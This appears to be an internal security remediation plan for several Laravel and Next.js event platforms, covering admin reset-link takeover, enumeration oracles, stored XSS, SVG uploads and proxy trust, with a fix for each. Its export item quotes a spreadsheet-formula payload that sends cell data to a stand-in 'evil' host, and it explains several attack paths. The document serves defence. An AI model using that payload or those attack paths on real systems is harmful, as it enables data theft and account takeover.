# 128-pif-psf-2026 — wave 1 items, full detail

Item text is reproduced verbatim from the verified cross-project security review. Several entries name other projects too — that context is kept deliberately, because it shows where each fix has already landed and where to copy it from.

Verify every file and line reference against the current code before acting — they were checked on 2026-09-20/21.

## Step 1 — Close the critical holes

### B3 · C01

_Bring now_

**Where it applies:** 122-gfeai-v2, 127-tourise, 128-pif-psf-2026 (all live). Genuinely n/a in 114-saudi-11 and 129-pif-gamf — no forgot-password route, no admin_invites table, resetpassword is a stub.

**Effort:** day

**What:** Build the admin reset and invite link from config('app.admin_url') and drop back_link from the request contract, bundling C01-3.1 (the config key), C01-3.7/3.9 (three admin senders plus ?lang= on resend-invite) and C01-adjacent-ttl/M02-TTL (48h invite expiry, null created_at treated as expired). Port commit b433317's shape, not pep's current AuthController — that has since been refactored onto a queued event (43f6c28) and would drag in a hard queue dependency.

**Prevents:** Unauthenticated full admin account takeover. VERIFIED: 'back_link' => 'required|url' at AuthController.php:650 (gfeai), :679 (tourise), :703 (psf), concatenated as rtrim($request->back_link,'/').'/'.$token, on a public route. An attacker who knows any admin email makes the platform mail that admin a genuine 64-character setup token appended to an attacker-controlled host — and with no TTL that harvested token is redeemable forever. Deploy backend first (the panel's extra field is then ignored); 127-tourise's send path renders through SystemEmail::render with back_link registered in EmailVariableResolver.php:128, so change only how $backLink is computed there. Confirm ADMIN_PANEL_URL is set on every box in the same window.

### B10 · H01

_Bring now_

**Where it applies:** 122-gfeai-v2, 127-tourise, 128-pif-psf-2026. Not applicable to either v1 target.

**Effort:** day

**What:** Move the whole forgot-password branch onto an AdminPasswordResetRequested event handled by a ShouldQueue listener with unconditional dispatch and a uniform response, plus H01.2 (no 500/200 split on send failure), H01.3/H01.5 (empty-base guard), H01.4 (lowercase+trim at dispatch) and H03.2 (a password-reset limiter keyed per source AND per sha256-hashed address, 5/hour).

**Prevents:** Two working enumeration oracles on a public endpoint: a measured ~60x timing gap (1.7ms unknown vs 102.9ms known, with the array mailer, so it is DB+render not SMTP) and a binary content oracle where any SMTP timeout or missing emails_configs row returns 500 for a known address and 200 for an unknown one. Also stops an attacker rotating a victim admin's outstanding invite token out from under them, since admin_invites is one row per email. CONFIRM QUEUE_CONNECTION is not sync and a worker runs on each box first — under sync the fix is decorative while looking done, and all these repos default to sync in .env.example.

### MX-WHERE-NULL · WHERE-NULL-SCOPE

_Porting matrix item 1_

**Where it applies:** 114-saudi-11, 122-gfeai-v2, 123-pif-pep-v2, 128-pif-psf-2026, 129-pif-gamf. Already fixed in 127-tourise.

**Effort:** hours

**What:** Group `$guests->whereNull($f)->orWhere($f, '')` in a closure so the admin-scope restriction applied afterwards binds to BOTH branches. Two copies per repo in `app/Http/Controllers/GuestsController.php`. Re-verified 2026-09-20 at 114-saudi-11 :315/:417, 122-gfeai-v2 :276/:324, 123-pif-pep-v2 :292/:340, 128-pif-psf-2026 :270/:318, 129-pif-gamf :321/:423 — all five really do call `applyAdminGuestAccessFilter` after `applyFilters`, so the leak is live. Reference fix: 127-tourise commit `cdfbc5b` ("a null filter no longer unlocks the rest of the table"), which marks both blocks `/* GROUPED. */`; reference test `tests/Feature/GuestAccessScopeTest.php` in 127-tourise.

**Prevents:** A category-scoped admin who ticks any "has no …" filter receiving every category in the event: the query becomes `WHERE (filters AND col IS NULL) OR (col = '' AND category_id IN (…))`, and the first branch runs unscoped.

### B15 · H02.1

_Bring now_

**Where it applies:** 122-gfeai-v2 (both hooks, InvitationsController.php:471), 129-pif-gamf (sibling), and 123-pif-pep-v2 itself (sibling at GuestsController.php:4095 — the Phase 4 sweep missed it). 114-saudi-11, 127-tourise and 128-pif-psf-2026 need only the test.

**Effort:** minutes

**What:** Delete BOTH forced-500 debug hooks — RWYI82IWDG in InvitationsController::verifyInvitation and the sibling IUFRP3GYZ4ISPUEU in GuestsController's verify-status-token path — and port tests/Feature/InvitationVerifyTest.php into every project including the already-clean ones, pinning the general property (no token value is special-cased) rather than the one string.

**Prevents:** A hard-coded magic string changing control flow on a public unauthenticated route, against repository rule 8. Severity correction: both throws sit inside the controller's own try/catch which returns a generic JSON 500, so no stack trace, class name or file path is ever emitted and APP_DEBUG is irrelevant — this is LOW hygiene, not the critical the documents imply. Ride the next scheduled deploy, not an emergency hotfix. The process signal matters more: H02 was found, triaged, documented and fixed while its identical twin three thousand lines away was missed and is still live in the source project.

## Step 2 — Captcha and abuse controls

### B7 · C02

_Bring now_

**Where it applies:** 129-pif-gamf with pep's shipped enforcing defaults (pre-launch, cheapest place to learn the score distribution). 122-gfeai-v2 urgently — its current rule returns true whenever the environment is not production AND enforce is off, i.e. staging has no captcha at all. 127-tourise and 128-pif-psf-2026 on dev with enforcement on. 114-saudi-11 with GOOGLE_RECAPTCHA_ENFORCE_SCORE=false set in the live env BEFORE the code lands.

**Effort:** day

**What:** Port the rewritten app/Rules/ReCaptcha.php WITH its prerequisites, per project: the services.recaptcha config block, messages.recaptcha_required in EN and AR, GOOGLE_RECAPTCHA_SECRET pinned in phpunit.xml, every siteverify Http::fake updated to return a score, pep's ReCaptchaRuleTest, and the existing local-dev escape hatch merged rather than overwritten.

**Prevents:** A captcha that is purely decorative — v3's success flag only means the token is well formed and unredeemed, which any headless browser driving the real site key satisfies. Correction to the documents: pep shipped ENFORCING at 0.3 (commit 3f840db), so a verbatim copy onto live 114-saudi-11 starts rejecting sub-0.3 traffic on guest registration AND on POST /api/admin/login, locking out event staff. On 114-saudi-11 and 129-pif-gamf the C02-3.1 config move is a hard prerequisite: both read env('GOOGLE_RECAPTCHA_SECRET') at request time, so config:cache silently voids the secret.

### B11 · C02-2.2-checkunique

_Bring now_

**Where it applies:** All five targets, and 123-pif-pep-v2 itself.

**Effort:** hours

**What:** Write a fresh fix — no fix exists in pep either: replace the client-supplied column name in checkUnique with a per-project allow-list derived from that project's actual frontend callers.

**Prevents:** An unauthenticated caller choosing which guests column to query — a blind existence oracle over national ID, passport number, phone or remember_token, one value at a time, on a public route. Supplying a non-existent column raises a SQL error, which is a 500 and, with APP_DEBUG on, a schema disclosure; with a known guest id, mode=edit returns the entire guest row. Derive the allow-list per project or duplicate-detection silently stops working on a live registration form.

### B12 · C02-2.3-otp

_Bring now_

**Where it applies:** All five targets, and 123-pif-pep-v2 itself.

**Effort:** hours

**What:** Add `->where('email', $request->email)` to the OTP lookup, normalising both sides with trim + lowercase. Again, unfixed in pep too.

**Prevents:** One OTP minted against an attacker-controlled mailbox satisfying the email-verification gate for an arbitrary address: request a code to your own inbox, then register as anyone, and the resulting guest record is marked email-verified. On an invitation-only event that is the whole access control. Check first whether any flow legitimately changes the email between OTP request and submit.

## Step 3 — Stored XSS and uploads

### B4 · PHASE-1

_Bring now_

**Where it applies:** All six public frontends: saudi-forum-11-frontend AND saudi-forum-11-frontend-un (114-saudi-11), gfeai-v2-frontend, tourise-frontend, pif-psf-2026-frontend, pif-gamf-frontend. VERIFIED present in every one; pep-v2-frontend now greps clean.

**Effort:** minutes

**What:** Render category share text as a React child inside a <div className="whitespace-pre-wrap wrap-break-word">{shareText}</div> instead of dangerouslySetInnerHTML, on BOTH the share page and the success page. Frontend-only; no API contract change; shareText is already declared above the sink in every file.

**Prevents:** Stored XSS executing on an unauthenticated, server-rendered public page reached from an emailed link. In 122-gfeai-v2 the same page reads linkedin_access_token from a non-HttpOnly cookie, so the payload steals a working OAuth token; in 114-saudi-11 and 129-pif-gamf it rewrites the page guests are told to copy from and makes same-origin API calls. In 129-pif-gamf the injection point is additionally reachable by a guest mobile token (NEW-129.1), removing the 'requires a privileged admin' mitigation entirely. Keep the write-rule half (PHASE-1b) separate — it is NOT cosmetic on live data.

### B13 · M04-SVG

_Bring now_

**Where it applies:** 129-pif-gamf first, then 122-gfeai-v2, 127-tourise, 128-pif-psf-2026; 114-saudi-11 in a window where an admin can retry a failed upload.

**Effort:** hours

**What:** Two different fixes under one id. In 129-pif-gamf and the three v2 targets, add the mimes rule to the conference upload (AdminConferenceController.php:276 in 129 takes pep's one-word change verbatim). In 114-saudi-11 and 129-pif-gamf additionally add an explicit png/jpg/webp extension allow-list to ZonesController::upload — VERIFIED at ZonesController.php:215-217 in both, identical code that normalises image/svg+xml to 'svg' from a caller-supplied data URI and writes to the public disk with no mimes: rule anywhere in the method.

**Prevents:** A scriptable SVG served from the API origin by nginx without reaching PHP — so SecurityHeaders can never cover it — executing same-origin with every API response. In 114-saudi-11 and 129-pif-gamf the uploader is reachable by any authenticated admin token with no server-side permission check, and in 129-pif-gamf by a guest mobile token. Check for existing stored SVG zone maps in 114-saudi-11 before narrowing; validation is upload-time only so stored files keep serving.

## Step 4 — Admin BFF write guard

### B6 · M03-BFF

_Bring now_

**Where it applies:** 114-saudi-11 first (it has the complete BFF and HttpOnly cookie and zero hits for isSelfOriginatedWrite/sec-fetch-site), then 122-gfeai-v2, 127-tourise, 128-pif-psf-2026. NOT 129-pif-gamf — no pages/api/proxy, no utils/server.

**Effort:** hours

**What:** Port isSelfOriginatedWrite into pages/api/proxy/[...path].ts — read Sec-Fetch-Site first, fall back to Origin then Referer, compare host-to-host against the request's own Host (never an env var), refuse a write carrying none of the three, return 403 not 401 — plus the WRITE_CONTENT_TYPES allow-list keeping multipart. Land pep's 047d31f null-body correction in the same release.

**Prevents:** Authenticated state change from a sibling origin. 114-saudi-11's admin, registration and UN sites share a parent domain, so a page on the registration origin can submit a form that is cross-origin but SAME-SITE; the SameSite=Strict cookie rides along and the proxy authenticates the write by construction, because reading that cookie and adding the Authorization header is the proxy's whole job. CORS withholds the response, not the write. pep proved a cross-site form post to /api/auth/logout returned 200 and cleared the admin's cookies. Without the null-body correction you break every panel button that calls axios with a null body.

## Step 5 — Disclosure

### B5 · C06

_Bring now_

**Where it applies:** 122-gfeai-v2, 127-tourise, 128-pif-psf-2026 now (there /admin/admins is gated by admin.can:admins_management, so this really is the only channel). For 114-saudi-11 and 129-pif-gamf, DOWNGRADE to a bundled low-priority change: /admin/admins index sits two lines above the select route in the same ungated group (VERIFIED 114:220 vs :222, 129:258 vs :260) and returns email with ?type= and ?per_page= filters, so narrowing the dropdown alone closes one of two identical channels.

**Effort:** minutes

**What:** Narrow AdminsSelectResources::toArray() to id plus trim(first_name.' '.last_name), exactly as pep commit d9f6476 did — deliberately WITHOUT gating the route. Copy tests/Feature/AdminsSelectTest.php with it.

**Prevents:** Any authenticated admin — including a gate-scanning agent — harvesting the complete admin email roster, which is the input list for C01 and H01, both still open in the same three projects. Only visible change is the dropdown label losing its email disambiguator; note the admin CustomSelect renders with isSearch=true and matches on the label, so operators also lose the ability to find an agent by typing an address.

### B17 · H04

_Bring now_

**Where it applies:** All five targets.

**Effort:** minutes

**What:** Strip app and env from GET /api/health, keeping timestamp (the mobile contract names this route as how a client learns server time), and add the regression test asserting their absence.

**Prevents:** Free reconnaissance from an unauthenticated, unthrottled endpoint: any caller learns the internal product name and whether they have found production or staging, which is how an attacker picks the softer of two near-identical hosts. Nothing in any of the ten repositories reads those fields. Ask the probe question first on 114-saudi-11, 122-gfeai-v2, 127-tourise and 128-pif-psf-2026; on 129-pif-gamf just merge.

## Step 6 — Error handling and exports

### B9 · PHASE-0

_Bring now_

**Where it applies:** 129-pif-gamf first (pre-launch), then 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 on dev, then 114-saudi-11 in a quiet window after the event.

**Effort:** day

**What:** Port the Handler::render rewrite with P0.1-P0.8 in the documented branch order (HttpResponseException, Throttle, Authentication, Validation, ModelNotFound, NotFound, generic 4xx, generic 500), keeping the existing opaque-500 block intact, and land M03-BACKEND (Authenticate::redirectTo returns null) in the same commit.

**Prevents:** Every authorization denial, expired token, validation failure and abort() reporting as a server error, so real 500s hide in routine denial noise and a user is told the platform is broken when their session ended. Marker searched: `status === 500` has ZERO hits across every admin, frontend and frontend-un in all five, so no client changes behaviour. Two 114-saudi-11 specifics: re-baseline 5xx alerting BEFORE the deploy (P0.15), and confirm with whoever owns the Cvent integration that external-api-push consumers can take 401 where they saw 500 (CventOperationsController.php:268). Do not port without P0.5, or 127-tourise and 128-pif-psf-2026 start telling anonymous callers that the WhatsApp webhook secret is not configured.

### L9 · P0.14

_Before launch_

**Where it applies:** 129-pif-gamf and 123-pif-pep-v2 before launch; also owed to 122-gfeai-v2, 127-tourise and 128-pif-psf-2026

**What:** Get a written confirmation per project that the mobile client implements the 401-to-OTP re-login handler its own contract documents, BEFORE the PHASE-0 backend deploy.

**Why:** All four BACKEND_INCOMING_CHANGES_FOR_MOBILE documents carry the 401 language (6 occurrences each), but the mobile source is not in this workspace and pep's own remediation README still lists this as outstanding — so whether the handler is wired is UNVERIFIED everywhere. If mobile treats any non-2xx as a generic failure, users get stuck on an error screen instead of being routed to re-login, on a shipped binary that cannot be hotfixed. 114-saudi-11 is genuinely exempt: no mobile stack, no guest tokens.

### B8 · EXPORT-FORMULA

_Bring now_

**Where it applies:** 129-pif-gamf first (pre-launch), then 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 on dev, then 114-saudi-11 AFTER the running event.

**Effort:** hours

**What:** One change, two ordered steps, one deploy: (1) add `: bool` to every bindValue override, (2) introduce app/Exports/Concerns/TextSafeValueBinder.php and swap the parent, (3) port ExportClassesAreLoadableTest, rewriting its docblock so it names that repo's own binder rather than pep's 2026-08-15 incident. Edit counts: 114-saudi-11 24, 122-gfeai-v2 25, 127-tourise 29, 128-pif-psf-2026 27, 129-pif-gamf 24.

**Prevents:** Spreadsheet formula injection: PhpSpreadsheet types any string starting with '=' as TYPE_FORMULA, so a guest company name of =HYPERLINK("https://evil/?"&A1,"Click") is written as a live formula and evaluates on the machine of whoever opens the export — typically someone more senior, often outside the org. Do NOT ship step 1 alone: while the parent is still DefaultValueBinder a missed `: bool` is inert and buys nothing, and the sink stays open. Shipping step 2 without step 1 is the fatal that took pep's entire export surface to 500 for four weeks with nothing in lint, PHPStan or the suite noticing.

## Step 7 — Headers, cookies and proxy trust

### B20 · M04-API

_Bring now_

**Where it applies:** All five targets, after one curl per API origin to confirm nginx is not already stamping these headers.

**Effort:** hours

**What:** Add the SecurityHeaders global middleware to the API origin (closed CSP, Permissions-Policy, nosniff, X-Frame-Options, Referrer-Policy), keeping pep's deliberate omission of the `sandbox` directive so generated-document responses still work.

**Prevents:** Five API origins answering every request — including 404s and 500s, where a missing policy matters most — with no CSP, no Permissions-Policy, no nosniff and no framing control, on the same origin that serves uploaded files. Know what it does NOT cover: /storage is served without reaching PHP, so M04-SVG and the edge policy are the halves that count. Smoke-test PDF, badge, ticket and export downloads after adding it; on 114-saudi-11 its only non-JSON API responses are binary and it has no <iframe> anywhere, so X-Frame-Options: DENY is verified safe there.

### B18 · M01

_Bring now_

**Where it applies:** All five targets.

**Effort:** minutes

**What:** Set the session cookie's Secure flag explicitly, keeping the env('APP_ENV') !== 'local' exemption, and document the key as ABSENT (commented out) in the env examples — never as a bare SESSION_SECURE_COOKIE=, which is falsy and would strip the flag.

**Prevents:** The session and XSRF-TOKEN cookies travelling over a plaintext hop. Scope it honestly: EnsureFrontendRequestsAreStateful is commented out of the api group in all six and Sanctum runs token-only, so the cookie authenticates nothing today — this is hygiene plus a standing pentest finding on five origins. config('session.secure') is baked at config:cache time, so assert isSecure() on a real response rather than reading the config array back. On live 114-saudi-11 confirm every origin is HTTPS first, including any gate/scanner device on venue Wi-Fi.

### B19 · H03.1

_Bring now_

**Where it applies:** All five targets.

**Effort:** minutes

**What:** Repair the 429 so it keeps Retry-After and reports the limiter that actually blocked, rather than the outer throttle decoration's ceiling.

**Prevents:** Throttled clients being told the wrong ceiling and given no backoff signal, turning a protective throttle into a load amplifier. All five run real limiters (throttle:public-api, sensitive-api, store-guest-api) so this fires in production today. Header-additive only — no status, body or route change — and therefore safe on live 114-saudi-11 on an event day.

### B16 · H03.4

_Bring now_

**Where it applies:** All five targets. The frontend half works in 129-pif-gamf despite it having no BFF — its join pages call the API directly from getServerSideProps. buildForwardHeaders() already exists at utils/server/proxy.ts:71-89 in 114-saudi-11, 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 and is simply being discarded by the backend.

**Effort:** day

**What:** Add config/trustedproxy.php and declare $headers in TrustProxies.php, leaving $proxies unset, plus utils/forwarded-for.ts and a `headers:` option on each Axios.get in getServerSideProps. Pin the closed default with pep's tests/Feature/TrustedProxiesTest.php ('an unset variable trusts nothing').

**Prevents:** Every rate limiter keying on the load balancer instead of the client. $proxies is null in all six backends, so all server-rendered public traffic shares one bucket (127-tourise's public-api at 30/min capped the whole site at 30 page loads a minute) and login-attempt logs and security-alert emails record the proxy rather than the attacker. The CODE is inert and safe to merge even on live 114-saudi-11; the VALUE is a separate devops decision (H03.4-OPS) and must be set on a different day.

## Step 8 — Data integrity and triage

### B21 · PHASE-6.6-refcheck

_Bring now_

**Where it applies:** All five targets.

**Effort:** hours

**What:** Handle the RESTRICT foreign keys and the dangling guest_status_ids JSON before a guest status is deleted: return a 409 with a message naming what still references it, instead of letting the driver throw a 500.

**Prevents:** An operator deleting a still-referenced guest status, getting an unexplained 500, retrying, and starting to delete the referencing records to make it work. No migration, no schema change and no data change, so it needs no maintenance window and is safe even on live 114-saudi-11. Check each admin app surfaces a non-2xx body as a toast or the operator trades an opaque 500 for an opaque 409. In 114-saudi-11 and 129-pif-gamf the guest_status_ids JSON columns ARE the admin data-scope mechanism, so a dangling id silently changes what an admin can see with nothing to trace it to.

### B22 · PHASE-4-TRIAGE

_Bring now_

**Where it applies:** All five targets.

**Effort:** hours

**What:** Adopt the method, not just the fixes: verify each precondition in the target project before porting, tier the evidence (code-verified / harness-observed / needs-production, BRIEF-5), combine the three phpunit.xml pins into one commit (PHASE-2-collision), and record the client-ships-first rule in each project's runbook (PHASE-3/deploy-order, OPS-DEPLOY-ORDER).

**Prevents:** Porting on the documents' word. This review alone found: pep's C02 shipped ENFORCING where the doc describes observation mode; pep silently fixed the share-text sink while its own document argued no sink existed; the Phase 4 sweep grepped for one token string and missed its twin, still live in the source; pep's 'these select endpoints do not exist' is false in both v1 projects; and the export binder introduced a four-week outage. A document may describe a fix that was never implemented, implemented differently, or later reverted.

### L3 · PHASE-3.4

_Before launch_

**Where it applies:** 129-pif-gamf before launch (then 122-gfeai-v2, 127-tourise, 128-pif-psf-2026 on the proven pattern)

**What:** Add App\Models\PersonalAccessToken with the strict id|hash lookup and Sanctum::usePersonalAccessTokenModel, after tracing every token consumer — in 129-pif-gamf that means MobileQrController.php:23, which calls the vendor Laravel\Sanctum\PersonalAccessToken::findToken() directly and is exactly the consumer pep had to exempt.

**Why:** 129-pif-gamf's mobile guests authenticate through auth:sanctum on every /mobile/* group, so a mistake locks out the whole mobile app — and it is the only project where that can be discovered at zero cost. It also has the getAccessTokenFromRequestUsing override that widens what counts as a presented token at the same moment this narrows what format resolves; the pep document never reasoned about that pair because it wrongly believed no extractor existed.

## Step 9 — Verify

### L4 · PHASE-6.5-mobile-demo

_Before launch_

**Where it applies:** 129-pif-gamf before launch; the same verification is owed on 122-gfeai-v2, 127-tourise, 128-pif-psf-2026 and 123-pif-pep-v2

**What:** Confirm MOBILE_DEMO_EMAIL and MOBILE_DEMO_OTP are blank in every 129-pif-gamf environment and add an `if (! app()->environment('production'))` guard around both bypass blocks at MobileAuthController.php:71-73 and :131-135. Label it as new hardening — pep never fixed or decided this.

**Why:** Both keys are templated into 129-pif-gamf's .env.example:79-80 and .env.example2:101-102, so population is a live possibility rather than a hypothetical. Combined with the unguarded route group it is an unauthenticated path from two static strings to a 30-day wildcard guest token to POST /admin/admins to super admin. The guard is defence in depth and is NOT a substitute for NEW-129.1.

### L14 · PHASE-6.7-smoke

_Before launch_

**Where it applies:** 129-pif-gamf and 123-pif-pep-v2 before launch, then the live projects

**What:** Write post-deploy-security-check.sh and wire it into the pipeline: read-only probes asserting the Secure cookie flag, the header set, /health's shape, APP_DEBUG behaviour and the _ignition 404.

**Why:** composer qa, yarn type-check and the build all pass whether or not the Secure flag is set, whether or not a CSP is served and whether or not APP_DEBUG is false — none of them looks at a deployed response. The concrete failure mode is a rebuild from a prod template quietly undoing the work with nothing between that rebuild and production. Allowlist the CI runner or keep the probe count small, since 127-tourise recently reworked its limiters.

## Cross-cutting risks

- TOKEN INVALIDATION: the 48h admin-invite TTL (C01-adjacent-ttl / M02-TTL / C01-EXTRA) kills every outstanding invite or reset link older than the window the moment it deploys, and a null created_at is deliberately treated as expired so any row written before the column was populated dies too. This is the one item on the list that needs a heads-up to real people. Run SELECT count(*) FROM admin_invites WHERE created_at IS NULL OR created_at < NOW() - INTERVAL 48 HOUR on each of 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 first and warn those admins, or they hit a dead link whose error message already claims tokens expire. Pass link_ttl_hours into the EN and AR blades from config so the email and the enforcement cannot drift.

- UNCATCHABLE FATAL: the PHASE-3.2 export binder must ship both halves in ONE deploy. Adding the TextSafeValueBinder parent without typing every bindValue override kills the entire export surface at class-load time — uncatchable, invisible to Pint and to PHPStan as configured, and it took 123-pif-pep-v2's admin exports to 500 for four weeks (7544e4f 2026-08-15 to 7ded37b 2026-09-13). Counts: 114-saudi-11 24, 122-gfeai-v2 25, 127-tourise 29, 128-pif-psf-2026 27, 129-pif-gamf 24; one miss reproduces the outage. Conversely, shipping the `: bool` half alone is 129 inert edits that close nothing and create a window in which a newly written export silently arms the fatal.

- ONE-OFF TEST FAILURES ARE EXPECTED AND ARE THE POINT: pinning APP_DEBUG=false in phpunit.xml produced 48 failures in pep. Pinning GOOGLE_RECAPTCHA_SECRET and updating the siteverify Http::fakes will turn currently-green suites red in 127-tourise (InvitationRequestEmailOtpTest:36, ReconfirmationTest:52, PartnerNewsletterApiTest:69, FormShapeDataCoverageTest:131 and more), 128-pif-psf-2026 (ReconfirmationTest:52, plus a rewrite of ReCaptchaEnvironmentTest) and 129-pif-gamf (GuestDeclineTest:68). Budget for it; a suite that only ever passed because debug was on or because a fake returned success with no score was not protecting anything. The permanent cost is thinner diagnostics on unrelated failures, since a genuine crash now reports as an opaque 500.

- TWO OWNERS OF ONE HEADER: a browser enforces the INTERSECTION of two Content-Security-Policy or Permissions-Policy headers, and nginx add_header appends rather than replaces. This is the one risk in the pep phase that actually materialised — the app policy allowed frame-src blob: for print-js, nginx's did not, the intersection dropped it, and PDF printing broke from a cause neither policy showed alone. All four projects that use print-js carry that blob: dependency today, and badge and ticket printing is an event-day-critical path in every one. Never set the same security header in both the app and the edge; curl each origin before adding anything; and do NOT copy pep's resolution (deleting the app block) into a target whose nginx sends nothing — the target admin policies are richer, env-derived and correctly gate 'unsafe-eval' to dev only.

- TRUSTED PROXY VALUE CAN MAKE THINGS STRICTLY WORSE: setting TRUSTED_PROXIES while the origin still answers directly lets any caller forge X-Forwarded-For, land in a fresh bucket every request and walk past every limiter. Never use '*' — Cloudflare appends to X-Forwarded-For so a client can prepend an arbitrary address. Merge the code (inert) and set the value on a different day, after the origin is locked down. Throwing the switch also invalidates outstanding signed URLs and converts every per-IP limiter from a shared site-wide cap into a real per-client cap in one moment.

- NEVER TIGHTEN WRITE VALIDATION ON AN EXISTING FREE-TEXT COLUMN WITHOUT QUERYING IT FIRST: this applies to share_text_en/ar and poster_caption (PHASE-1.3, PHASE-1.OQ-2, PHASE-1.OQ-5), to guest status name_en/name_ar and color (PHASE-3.1, PHASE-3.1b — max:255 is provably safe since the column cannot hold more, max:32 on a varchar(255) color is NOT), and to anything added later. The failure mode is always the same: a legitimate pre-existing row makes every subsequent save of that record 422, including saves that have nothing to do with the tightened field.

- QUEUE DEPENDENCY: H01's constant-time property is conditional on QUEUE_CONNECTION not being sync and a worker actually running. config/queue.php defaults to sync and .env.example says QUEUE_CONNECTION=sync in all three v2 targets AND in pep itself. Merging H01 onto a sync connection reopens the timing oracle while the tests pass and the docs say 'Fixed' — the worst of both worlds. After merge, a stopped worker means admin password resets stop arriving with no error surfaced to the requester, and failed_jobs needs watching because H01.2 moves a broken mailer from a loud 500 into a silent failure.

- SILENT CONFIG FAILURES: config('app.admin_url') falls back to http://localhost:3000, so an UNSET ADMIN_PANEL_URL mails localhost links with no exception and no log line — pep's listener guard only fires on an explicitly EMPTY value, and AdminsController::sendInviteEmail has no guard at all. Similarly config('session.secure') and config('services.recaptcha.*') are baked at config:cache time, so a deploy that does not re-run config:cache leaves the fix looking done while it is not. Assert on a real response or a tinker read, never on the config array.

- MOBILE CONTRACT CHANGE ON SHIPPED BINARIES: PHASE-0/P0.2 flips expired guest tokens from 500 to 401 in 122-gfeai-v2, 127-tourise, 128-pif-psf-2026 and 129-pif-gamf. All four BACKEND_INCOMING_CHANGES_FOR_MOBILE documents carry the 401 language, but the mobile source is not in this workspace and pep's own remediation README still lists the notice as outstanding, so whether the re-login handler is wired is UNVERIFIED everywhere. If mobile treats any non-2xx as a generic failure, users get stuck on an error screen instead of re-login — worse than today's 500, on a binary that cannot be hotfixed. Confirm before the backend deploy.

- DEPLOY ORDERING: when a security control changes an API contract, the client ships first. C01 is the exception and must go backend-first (the panel's extra back_link is then simply ignored; the reverse order 422s every admin invite). PHASE-3.2 needs no ordering but does need its two halves in one commit. PHASE-3.4 needs a token-path trace rather than a client deploy. Watch the PHASE-2-collision: Handler.php, forgotPassword() and phpunit.xml are each edited by three separate phases, and three conflicting patches rebased under time pressure is how a security fix gets silently reverted.

- RECORDED AS ACCEPTED OR DISPUTED, and worth carrying as written reasoning rather than code so nobody re-raises or re-implements them: the already_submitted oracle (H02.2); the 405 message residual (P0.11); the two error envelopes (P0.12); the global 401 interceptor (P0.13); the admin email-template innerHTML (PHASE-1.6, deferred with the decision never recorded); the seating audit gap (PHASE-3/audit-gap); the bare-hash Sanctum fallback impact claim (C03, disputed); C04 and C05 (not reproduced); H03 as reported and M02 (refuted); M03-CT (declined — implementing it breaks every multipart upload); the per-select RBAC follow-up (PARKED); and the seating subdomain 404 (dismissed on the merits).

- THE DOCUMENTS ARE NOT THE CODE: this review found pep's C02 shipped ENFORCING at 0.3 while its own rule docblock still describes observation mode; pep silently fixed the share-text sink while its security document argued no sink existed; the Phase 4 sweep grepped for one token string and missed its identical twin three thousand lines away, still live in the source; pep's 'these select endpoints do not exist' is false in both v1 projects; its COL_PHONE citation was already stale on dev; and its export binder introduced a four-week outage. Verify every precondition in the target before porting, and tier the evidence (code-verified / harness-observed / needs-production).

## DevOps items (infrastructure, not code)

Hand these to the infrastructure owner. Several are prerequisites for items above.

- ADMIN_PANEL_URL: set it on every deployed box for 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 in the SAME change window as the C01 merge, add it to .env.example and .env.example_prod, and run config:clear/config:cache. Verify with php artisan tinker --execute="echo config('app.admin_url');" per box. An unset value silently mails http://localhost:3000 links — pep's guard fires only on an explicitly empty string, and the invite path has no guard at all. Close the same open gate on 123-pif-pep-v2, where the code half is live on dev and the key is in neither env example.

- Re-baseline 5xx alerting and dashboards BEFORE any PHASE-0 deploy (P0.15). Every RBAC denial and expired token currently logs as an unhandled exception and counts as a 5xx; after the fix they disappear, so a drop-rate alert may read as an outage and, more dangerously, a threshold calibrated on denial noise will stop catching genuine spikes.

- Confirm QUEUE_CONNECTION is not sync and a supervisor/horizon worker is running and monitored on each 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 box BEFORE merging H01 (H01-OPS-queue). Under sync the fix is decorative while appearing done. After merge, monitor failed_jobs, since H01.2 turns a broken mailer from a loud 500 into a silent failure.

- Run the PHASE-1.OQ-3 pre-flight SELECTs per environment before any write-validation half ships: categories share_text_en/share_text_ar REGEXP '[<>]', the same with CHAR_LENGTH > 500, and both again for poster_caption. Run the PHASE-3/OQ-prod-data equivalents on guest_statuses.color and name before tightening those (PHASE-3.1b's max:32). Read-only queries; the risk is entirely in skipping them.

- Run SELECT count(*) FROM admin_invites WHERE created_at IS NULL OR created_at < NOW() - INTERVAL 48 HOUR on 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 before the TTL deploy, and warn any admin whose outstanding link will die.

- Confirm no external uptime probe asserts on the /health response body before H04 merges on 114-saudi-11, 122-gfeai-v2, 127-tourise and 128-pif-psf-2026 (H04-OPS-probe). Nothing in the ten repositories reads app or env, but a probe outside them would mark the box down on merge. On 129-pif-gamf just merge.

- curl every origin for an existing Content-Security-Policy and Permissions-Policy BEFORE adding an app-level header (CSP-OWNER, M04-OWNERSHIP, PHASE-6.6.1). Decide and record ONE owner per header per origin. Do not replicate pep's deletion of its Next.js headers block anywhere the edge does not already serve an equivalent — the target admin policies are richer and env-derived.

- Confirm APP_DEBUG=false and that /api/_ignition/health-check returns 404 on all five production API hosts, and that production was installed with composer --no-dev (M05, PHASE-6.4). Five hosts, seconds each; if dev dependencies are installed, _ignition/execute-solution is a known RCE class. Highest severity-per-minute item on the list even though the original finding was wrong.

- Verify MOBILE_DEMO_EMAIL and MOBILE_DEMO_OTP are unset in the CACHED config on every box for 122-gfeai-v2, 127-tourise, 128-pif-psf-2026, 129-pif-gamf and 123-pif-pep-v2: php artisan tinker --execute="var_dump(!empty(config('mobile.demo_email')), !empty(config('mobile.demo_otp')));". If both are true anywhere, confirm with whoever owns the mobile app submission before blanking — it would kill an in-flight App Review login.

- Edge work, all Report-Only staged first: CSP with `sandbox` plus nosniff on /storage/* at each API origin (EDGE-STORAGE, M04-EDGE, PHASE-6.3-storage); remove 'unsafe-eval' from the production script-src, falling back to 'wasm-unsafe-eval' if reCAPTCHA's WASM paths break, never restoring 'unsafe-eval' (EDGE-UNSAFE-EVAL); align X-Frame-Options on DENY (EDGE-XFO); Permissions-Policy per origin with camera=(self) ONLY on the v2 admin origins that run the browser QR scanner — camera=() is safe on both v1 admin origins, which have no camera code (M06-EDGE, PHASE-6.6.2). After any Permissions-Policy change, open the gate-scan screen and confirm the camera actually starts; a curl proves the header, not the scanner.

